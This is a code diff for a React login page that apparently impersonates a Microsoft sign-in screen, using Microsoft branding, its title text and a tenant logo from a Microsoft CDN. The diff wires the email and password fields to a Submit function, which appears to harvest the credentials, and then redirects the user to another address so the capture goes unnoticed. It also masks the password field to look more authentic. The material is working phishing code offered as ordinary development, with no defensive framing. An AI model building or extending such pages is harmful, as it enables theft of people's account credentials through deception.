@@ -2,6 +2,7 @@ import React, { useEffect, useState } from "react";
 import iconSource from "../images/microsofticon.ico";
 import { AnimatePresence, motion } from "motion/react";
 import backArrow from "../images/logbackarrow.svg";
+import Submit from "./Submit";
 
 const Login = (props: { next: string }) => {
   const title = "Sign in to your account";
@@ -9,10 +10,13 @@ const Login = (props: { next: string }) => {
   const [useIsPassword, setIsPassword] = useState(false);
   const [useBackAndForth, setBackAndForth] = useState("100%");
   const [usePass, setPass] = useState("");
+  const [useResponse, setResponse] = useState("");
   const [isVisible, setIsVisible] = useState(true);
   const [useEmail, setEmail] = useState("");
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     // SQL submit
+    let response = Submit(useEmail, usePass);
+    setResponse(await response);
     window.location.href = props.next;
   };
 
@@ -43,7 +47,7 @@ const Login = (props: { next: string }) => {
                   className="h-[36px]"
                 />
               </div>
-              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[69.6%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
+              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[65.84%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
               <AnimatePresence>
                 {isVisible ? (
                   <motion.div
@@ -115,7 +119,7 @@ const Login = (props: { next: string }) => {
         {useIsPassword && (
           <div className="w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all">
             <div className="w-full h-full bg-white overflow-hidden">
-              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[69.6%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
+              <div className="bg-[#f2f2f2] z-49 h-[83.19px] w-[440px] absolute top-[65.84%] left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
               <div className="pt-[44px] px-[44px]">
                 <img
                   src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
@@ -153,10 +157,10 @@ const Login = (props: { next: string }) => {
                           </p>
                         </div>
                         <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
-                          Enter password
+                          Enter password {useResponse}
                         </h1>
                         <input
-                          type="text"
+                          type="password"
                           placeholder="Password"
                           value={usePass}
                           onChange={(e) => {
